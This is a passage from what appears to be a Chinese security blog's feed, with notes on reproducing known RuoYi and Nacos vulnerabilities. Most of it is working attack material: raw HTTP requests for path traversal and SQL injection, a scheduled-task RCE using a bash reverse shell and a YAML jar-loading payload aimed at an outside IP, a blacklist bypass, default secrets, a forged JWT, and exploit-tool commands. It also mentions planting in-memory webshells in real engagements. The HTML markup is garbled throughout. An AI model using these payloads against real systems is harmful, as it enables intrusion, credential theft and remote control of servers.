class="hljs-keyword">SOME</span>    如果在一组比较中，有些比较为<span class="hljs-literal">true</span>，那么结果为<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="布尔盲注-2"><a href="#布尔盲注-2" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h2 id="时间盲注-2"><a href="#时间盲注-2" class="headerlink" title="时间盲注"></a>时间盲注</h2><h2 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h2><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ruoyi历史漏洞复现</title>
    <link href="/2024/08/12/ruoyi%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/08/12/ruoyi%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="若依历史漏洞复现"><a href="#若依历史漏洞复现" class="headerlink" title="若依历史漏洞复现"></a>若依历史漏洞复现</h1><h2 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h2><ul><li>shiro1.24存在默认秘钥</li><li>或者任意文件读取配合 去读取配置文件(1.24之后秘钥写在配置文件中)</li></ul><h2 id="任意文件读取一"><a href="#任意文件读取一" class="headerlink" title="任意文件读取一"></a>任意文件读取一</h2><h3 id="影响版本：RuoYi"><a href="#影响版本：RuoYi" class="headerlink" title="影响版本：RuoYi&lt;4.5.1"></a>影响版本：RuoYi&lt;4.5.1</h3><ul><li><pre><code class="hljs">/common/download/resource?resource=/profile/../../../../../../../etc/passwd<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-comment">## 任意文件读取二</span><br><br><span class="hljs-comment">### 影响版本：RuoYi&lt;4.7.6 </span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">首先创建一个定时任务</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">```</span><br>    <span class="hljs-attribute">POST /monitor/job/add HTTP/1.1</span><br><span class="hljs-attribute">    Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">127.0.0.1</span><br>    <span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br>    <span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/json, text/javascript, */*; q=0.01</span><br>    <span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br>    <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate</span><br>    <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/x-www-form-urlencoded; charset=UTF-8</span><br>    <span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">:</span> <span class="hljs-string">XMLHttpRequest</span><br>    <span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">184</span><br>    <span class="hljs-attribute">Origin</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://127.0.0.1</span><br>    <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">close</span><br>    <span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://127.0.0.1/monitor/job/add</span><br>    <span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">JSESSIONID=07ec5ec3-ceee-42bc-996a-32dc8f5bb7d0</span><br>    <span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">:</span> <span class="hljs-string">empty</span><br>    <span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cors</span><br>    <span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">:</span> <span class="hljs-string">same-origin</span><br>    <br>    createBy=admin&amp;jobName=aaaaa&amp;jobGroup=DEFAULT&amp;invokeTarget=ruoYiConfig.setProfile(&#x27;c%3A%5C%5Cquartz.sql&#x27;)&amp;cronExpression=0+0+2+1%2F1+*+%3F&amp;misfirePolicy=1&amp;concurrent=1&amp;status=0&amp;remark=<br></code></pre></td></tr></table></figure>- 这个包最好先在本地构建一遍，然后再修改关键参数 否则容易操作失败- 如果能图形化操作最好图形化操作- 执行一遍这个任务- ```  POST /monitor/job/run HTTP/1.1  Host: 127.0.0.1  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0  Accept: application/json, text/javascript, */*; q=0.01  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  Accept-Encoding: gzip, deflate  Content-Type: application/x-www-form-urlencoded; charset=UTF-8  X-Requested-With: XMLHttpRequest  Content-Length: 9  Origin: http://127.0.0.1  Connection: close  Referer: http://127.0.0.1/monitor/job  Cookie: JSESSIONID=07ec5ec3-ceee-42bc-996a-32dc8f5bb7d0  Sec-Fetch-Dest: empty  Sec-Fetch-Mode: cors  Sec-Fetch-Site: same-origin    jobId=108  <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-bullet">- </span>最后即可通过下载任意文件 获取前面构造的文件内容<br><br></code></pre></td></tr></table></figure>  GET /common/download/resource?resource=2.txt  <figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-comment">## sql注入一</span><br><br><span class="hljs-comment">### 影响版本：RuoYi&lt; 4.6.2</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">```</span><br>  <span class="hljs-attribute">POST /system/role/list HTTP/1.1</span><br><span class="hljs-attribute">  Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">127.0.0.1</span><br>  <span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br>  <span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/json, text/javascript, */*; q=0.01</span><br>  <span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br>  <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate</span><br>  <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br>  <span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">:</span> <span class="hljs-string">XMLHttpRequest</span><br>  <span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">178</span><br>  <span class="hljs-attribute">Origin</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://127.0.0.1</span><br>  <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">close</span><br>  <span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://127.0.0.1/system/user</span><br>  <span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">JSESSIONID=07ec5ec3-ceee-42bc-996a-32dc8f5bb7d0</span><br>  <span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">:</span> <span class="hljs-string">empty</span><br>  <span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cors</span><br>  <span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">:</span> <span class="hljs-string">same-origin</span><br>  <br>  pageSize=&amp;pageNum=&amp;orderByColumn=&amp;isAsc=&amp;roleName=&amp;roleKey=&amp;status=&amp;params[beginTime]=&amp;params[endTime]=&amp;params[dataScope]=and extractvalue(1,concat(0x7e,(select version()),0x7e))<br></code></pre></td></tr></table></figure>- 看回显是否有想要的信息即可判断- ```  POST /system/dept/edit HTTP/1.1  Host: 127.0.0.1  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0  Accept: application/json, text/javascript, */*; q=0.01  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  Accept-Encoding: gzip, deflate  Content-Type: application/x-www-form-urlencoded  X-Requested-With: XMLHttpRequest  Content-Length: 111  Origin: http://127.0.0.1  Connection: close  Referer: http://127.0.0.1/system/user  Cookie: JSESSIONID=07ec5ec3-ceee-42bc-996a-32dc8f5bb7d0  Sec-Fetch-Dest: empty  Sec-Fetch-Mode: cors  Sec-Fetch-Site: same-origin    DeptName=1&amp;DeptId=100&amp;ParentId=12&amp;Status=0&amp;OrderNum=1&amp;ancestors=0)or(extractvalue(1,concat((select user()))));#  <figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-bullet">-</span> <span class="hljs-string">回显的是user()内容 一般是localhost</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">```</span><br>  <span class="hljs-attribute">POST /system/role/export HTTP/1.1</span><br><span class="hljs-attribute">  Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">127.0.0.1</span><br>  <span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br>  <span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/json, text/javascript, */*; q=0.01</span><br>  <span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br>  <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate</span><br>  <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br>  <span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">:</span> <span class="hljs-string">XMLHttpRequest</span><br>  <span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">75</span><br>  <span class="hljs-attribute">Origin</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://127.0.0.1</span><br>  <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">close</span><br>  <span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://127.0.0.1/system/user</span><br>  <span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">JSESSIONID=07ec5ec3-ceee-42bc-996a-32dc8f5bb7d0</span><br>  <span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">:</span> <span class="hljs-string">empty</span><br>  <span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cors</span><br>  <span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">:</span> <span class="hljs-string">same-origin</span><br>  <br>  params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))<br></code></pre></td></tr></table></figure>## sql注入二（4.7.0&lt;x&lt;4.7.5）<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/tool/gen/createTable</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">user-agent</span><span class="hljs-punctuation">: </span>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=62627303-0fd9-45d8-be63-2fbcb8de6594<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>57<br><br><span class="language-pgsql"><span class="hljs-keyword">sql</span>=<span class="hljs-keyword">create</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">table</span><span class="hljs-comment">/**/</span>test<span class="hljs-comment">/**/</span><span class="hljs-keyword">as</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">database</span></span><br></code></pre></td></tr></table></figure></code></pre></li></ul><h2 id="后台计划任务（RuoYi"><a href="#后台计划任务（RuoYi" class="headerlink" title="后台计划任务（RuoYi&lt;4.6.2）"></a>后台计划任务（RuoYi&lt;4.6.2）</h2><ul><li><p>org.springframework.jndi.JndiLocatorDelegate.lookup(‘rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;refObj’)javax.naming.InitialContext.lookup(‘ldap:&#x2F;&#x2F;:&#x2F;#Exploit’)两个poc选其一即可</p></li><li><p>git clone <a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p></li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Runtime</span>.getRuntime().exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/47.236.228.126/3333 0&gt;&amp;1&quot;</span>&#125;);<br><br>这上面这一句放到src目录里那个java文件中 另外两个<span class="hljs-keyword">Runtime</span>的注释掉<br></code></pre></td></tr></table></figure><ul><li><pre><code class="hljs">javac AwesomeScriptEngineFactory.java<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```<br>  jar -cvf yaml-payload.jar -C src/ .<br></code></pre></td></tr></table></figure></code></pre></li><li><p>此时会生成一个jar包</p></li><li><p>vps开个下载</p></li><li><p>若依创建定时任务</p></li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm"># 调用目标字符串<br>org.yaml.snakeyaml.Yaml.<span class="hljs-keyword">load</span>(&#x27;!<span class="hljs-title">!javax.script.ScriptEngineManager</span> [<br>  !<span class="hljs-title">!java.net.URLClassLoader</span> [[<br>    !<span class="hljs-title">!java.net.URL</span> [<span class="hljs-string">&quot;http://47.236.228.126:3334/yaml-payload.jar&quot;</span>]<br>  ]]<br>]&#x27;)<br><br># cron 表达式<br><span class="hljs-number">0</span>/<span class="hljs-number">10</span> * * * * ?<br></code></pre></td></tr></table></figure><ul><li><a href="https://mp.weixin.qq.com/s/SZv32Wk6aiPJGGmfrFoU7w">https://mp.weixin.qq.com/s/SZv32Wk6aiPJGGmfrFoU7w</a></li><li>反弹shell 可能挂网站 可以打内存马</li><li>实战的时候要注意看对方是啥系统 上面的payload只有linux适用</li></ul><h2 id="版本4-6-2"><a href="#版本4-6-2" class="headerlink" title="版本4.6.2&lt;&#x3D;Ruoyi&lt;4.7.2"></a>版本4.6.2&lt;&#x3D;Ruoyi&lt;4.7.2</h2><ul><li>采用黑名单做了限制</li><li>定时任务屏蔽ldap远程调用</li><li>定时任务屏蔽http(s)远程调用</li><li>定时任务屏蔽rmi远程调用</li><li>org.yaml.snakeyaml.Yaml.load(‘!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“h’t’t’p’:&#x2F;&#x2F;127.0.0.1:88&#x2F;yaml-payload.jar”]]]]’)</li><li>加引号即可绕过</li></ul><h2 id="后台任意文件下载"><a href="#后台任意文件下载" class="headerlink" title="后台任意文件下载(&lt;&#x3D;4.7.6)"></a>后台任意文件下载(&lt;&#x3D;4.7.6)</h2><ul><li><p>POST &#x2F;monitor&#x2F;job&#x2F;add HTTP&#x2F;1.1<br>Host: 127.0.0.1<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko&#x2F;20100101 Firefox&#x2F;107.0<br>Accept: application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01<br>Accept-Language: en-CA,en-US;q&#x3D;0.7,en;q&#x3D;0.3<br>Accept-Encoding: gzip, deflate<br>Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8<br>X-Requested-With: XMLHttpRequest<br>Content-Length: 188<br>Connection: close<br>Cookie: o0At_2132_saltkey&#x3D;JW6Gt2hb; o0At_2132_lastvisit&#x3D;1691240426; o0At_2132_ulastactivity&#x3D;2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID&#x3D;61e79ae9-8cdd-4e51-baac-d269ef551df3</p><p>createBy&#x3D;admin&amp;jobName&#x3D;renwu&amp;jobGroup&#x3D;DEFAULT&amp;invokeTarget&#x3D;ruoYiConfig.setProfile(‘c:&#x2F;&#x2F;windows&#x2F;win.ini’)&amp;cronExpression&#x3D;0%2F15+<em>+</em>+<em>+</em>+%3F&amp;misfirePolicy&#x3D;1&amp;concurrent&#x3D;1&amp;status&#x3D;0&amp;remark&#x3D;</p></li><li><p>先提交一个定时任务(cookie记得替换)</p></li><li><p><a href="http://127.0.0.1/common/download/resource?resource=c://windows/win.ini:.zip">http://127.0.0.1/common/download/resource?resource=c://windows/win.ini:.zip</a></p></li><li><p>然后下载即可</p></li></ul><h2 id="thymeleaf-模板注入（4-6-0）"><a href="#thymeleaf-模板注入（4-6-0）" class="headerlink" title="thymeleaf 模板注入（4.6.0）"></a>thymeleaf 模板注入（4.6.0）</h2><ul><li><a href="http://127.0.0.1/common/download/resource?resource=c://windows/win.ini:.zip">http://127.0.0.1/common/download/resource?resource=c://windows/win.ini:.zip</a></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>nacos历史漏洞复现</title>
    <link href="/2024/08/02/nacos%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/08/02/nacos%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="nacos历史漏洞复现"><a href="#nacos历史漏洞复现" class="headerlink" title="nacos历史漏洞复现"></a>nacos历史漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><p><a href="https://github.com/alibaba/nacos">https://github.com/alibaba/nacos</a></p></li><li><p>启动路径 nacos&#x2F;nacos-2.3.2&#x2F;bin</p></li><li><pre><code class="hljs">启动命令./startup.sh -m standalone<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs dts"><br>- <span class="hljs-number">8848</span>端口<br><br><span class="hljs-meta">## 默认口令</span><br><br>- nacos/nacos<br><br><span class="hljs-meta">## 浏览器代理身份绕过(nacos&lt;1.4.1)</span><br><br>- 将User-Agent: 更改为 **Nacos-Server** 即可绕过身份认证<br><br>- 访问<span class="hljs-keyword">/nacos/</span>v1<span class="hljs-keyword">/auth/</span>users?pageNo=<span class="hljs-number">1</span><span class="hljs-variable">&amp;</span>pageS<span class="hljs-attr">ize</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> 正常返回<span class="hljs-number">404</span><br><br>- 但只要把ua改成 Nacos-Server即可返回账号密码<br><br>- 获取到的密码可以爆破<br><br>- 同时可以创建用户名密码进行登录<br><br>- curl -X POST -d <span class="hljs-string">&quot;username=test&amp;password=test&quot;</span> -H <span class="hljs-string">&quot;User-Agent: Nacos-Server&quot;</span> <span class="hljs-string">&quot;http://192.168.30.131:8848/nacos/v1/auth/users&quot;</span><br><br>  ![image<span class="hljs-number">-20240830154915962</span>](..<span class="hljs-keyword">/image/</span>nacos历史漏洞复现/image<span class="hljs-number">-20240830154915962.</span>png)<br><br>- 有些版本不用构造ua 可以直接访问<br><br>- 还有一些路径可以尝试访问获取敏感信息<br><br>- <span class="hljs-keyword">/nacos/</span>v1<span class="hljs-keyword">/auth/</span>users?pageNo=<span class="hljs-number">1</span><span class="hljs-variable">&amp;</span>pageS<span class="hljs-attr">ize</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><br>- <span class="hljs-keyword">/nacos/</span>v1<span class="hljs-keyword">/cs/</span>configs?dataId=<span class="hljs-variable">&amp;group</span>=<span class="hljs-variable">&amp;</span>appN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;config_tags</span>=<span class="hljs-variable">&amp;</span>pageNo=<span class="hljs-number">1</span><span class="hljs-variable">&amp;</span>pageS<span class="hljs-attr">ize</span><span class="hljs-operator">=</span><span class="hljs-number">10</span><span class="hljs-variable">&amp;tenant</span>=dev<span class="hljs-variable">&amp;search</span>=accurate<br><br>- <span class="hljs-keyword">/nacos/</span>v1<span class="hljs-keyword">/core/</span>cluster/nodes?withI<span class="hljs-attr">nstances</span><span class="hljs-operator">=</span>false<span class="hljs-variable">&amp;</span>pageNo=<span class="hljs-number">1</span><span class="hljs-variable">&amp;</span>pageS%<span class="hljs-number">20</span><span class="hljs-attr">ize</span><span class="hljs-operator">=</span><span class="hljs-number">10</span><span class="hljs-variable">&amp;keyword</span><br><br><span class="hljs-meta">## jwt伪造身份绕过（0.1.0&lt;=nacos&lt;=2.2.0）</span><br><br>- 配置文件中存在默认秘钥 开发者可能没有替换<br><br>- **SecretKey012345678901234567890123456789012345678901234567890123456789**<br><br>  ![image<span class="hljs-number">-20240830155329863</span>](..<span class="hljs-keyword">/image/</span>nacos历史漏洞复现/image<span class="hljs-number">-20240830155329863.</span>png)<br><br>- 在秘钥部分填入默认的 然后尝试构造登陆即可<br><br>- 登录时抓包<br><br>- 添加后放包<br><br>- ```<br><span class="hljs-symbol">  Authorization:</span> Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTg5MTA3MTgxMH0.eGXadXUaD2rzhbO17oGXx23O00GbU3alxX7Vjaswtvo<br></code></pre></td></tr></table></figure></code></pre></li><li><p>手工的话用上面这个直接替换就行 如果秘钥被改了基本无解</p></li></ul><h2 id="Nacos-Hessian反序列化漏洞"><a href="#Nacos-Hessian反序列化漏洞" class="headerlink" title="Nacos Hessian反序列化漏洞"></a>Nacos Hessian反序列化漏洞</h2><ul><li><p>（1.4.0&lt;&#x3D;Nacos&lt;1.4.6, 2.0.0&lt;Nacos&lt;2.2.3）</p></li><li><p>nacos默认的7848端口是用来处理集群模式下raft协议的通信，该端口的服务在处理部分jraft请求的时候使用hessian传输协议进行反序列化过滤不严，导致rce</p></li><li><p>nacos 1.x在单机模式下默认不开放7848端口，但是集群模式下受影响。</p></li><li><p>2.x版本无论单机还是集群均开放7848端口</p></li><li><p>主要受影响的是7848端口的Jraft服务。</p></li><li><p>当使用docker未映射7848端口时也不受影响</p></li><li><p>poc下载：<a href="https://github.com/c0olw/NacosRce">https://github.com/c0olw/NacosRce</a></p></li><li><p>jdk1.8 以下是内存马注入的命令</p></li><li><pre><code class="hljs">java -jar NacosRce.jar http://192.168.10.128:8848/nacos  7848 &quot;whoami&quot;</code></pre></li></ul><h2 id="Nacos-Client-Yaml反序列化（nacos"><a href="#Nacos-Client-Yaml反序列化（nacos" class="headerlink" title="Nacos-Client Yaml反序列化（nacos&lt;1.4.2）"></a>Nacos-Client Yaml反序列化（nacos&lt;1.4.2）</h2><ul><li>盲打客户端 该漏洞只影响特定配置下的客户端</li><li>单独使用 <strong>nacos-client</strong> SDK的用户，原因在于spring cloud、springboot、dubbo等框架中并非使用的 <strong>AbstractConfigChangeListener</strong> 监听配置，所以该漏洞只影响了使用<strong>AbstractConfigChangeListener</strong>监听配置的客户端</li></ul><h2 id="Nacos基于sql注入漏洞的rce（"><a href="#Nacos基于sql注入漏洞的rce（" class="headerlink" title="Nacos基于sql注入漏洞的rce（&lt;2.4.0）"></a>Nacos基于sql注入漏洞的rce（&lt;2.4.0）</h2><ul><li><a href="https://github.com/FFR66/Nacos_Rce">https://github.com/FFR66/Nacos_Rce</a></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php命令执行总结</title>
    <link href="/2024/01/22/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/"/>
    <url>/2024/01/22/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</url>
    
